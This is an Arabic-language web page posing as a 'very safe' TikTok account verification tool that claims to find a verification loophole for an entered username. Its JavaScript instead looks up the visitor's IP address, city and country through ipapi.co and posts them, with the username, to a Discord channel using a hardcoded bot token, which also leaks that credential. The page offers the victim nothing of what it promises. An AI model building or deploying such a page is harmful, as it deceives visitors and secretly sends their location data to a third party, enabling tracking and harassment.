<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>توثيق حساب تيك توك ! امن جدا </title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
        .card { background: white; padding: 2rem; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 350px; }
        .badge { color: #1da1f2; font-size: 50px; margin-bottom: 10px; }
        input { width: 80%; padding: 10px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; text-align: center; }
        button { background: #fe2c55; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
        #status { font-size: 12px; color: #666; margin-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <div class="badge">✔️</div>
    <h2>توثيق حساب تيك توك</h2>
    <p>أدخل يوزر تيك توك للبحث عن ثغرة التوثيق</p>
    <input type="text" id="username" placeholder="Username...">
    <button onclick="sendToBot()">بدء العملية</button>
    <p id="status"></p>
</div>

<script>
async function sendToBot() {
    const username = document.getElementById('username').value;
    const status = document.getElementById('status');
    const botToken = "MTU1NTkxNzY0NzUwMDI3OTg1OQ.GecFUr.QZIGGa-zD5k3I2A8r_W4auuQUewCUxSOYGZB7U";

    if (!username) {
        alert("يرجى كتابة اليوزر");
        return;
    }

    status.innerText = "جاري جمع البيانات...";

    try {
        
        const ipRes = await fetch('https://ipapi.co/json/');
        const ipData = await ipRes.json();
        const info = `اليوزر: ${username} | IP: ${ipData.ip} | الموقع: ${ipData.city}, ${ipData.country_name}`;

        
        const channelId = "https://discord.com/channels/1499694048024465549/1557106961441624094";
        
        const response = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
            method: 'POST',
            headers: {
                'Authorization': `Bot ${botToken}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ content: info })
        });

        if (response.ok) {
            status.innerText = "تم إرسال البيانات بنجاح!";
        } else {
            status.innerText = "حدث خطأ في الإرسال.";
        }
    } catch (e) {
        status.innerText = "فشل الاتصال بالخادم.";
    }
}
</script>

</body>
</html>
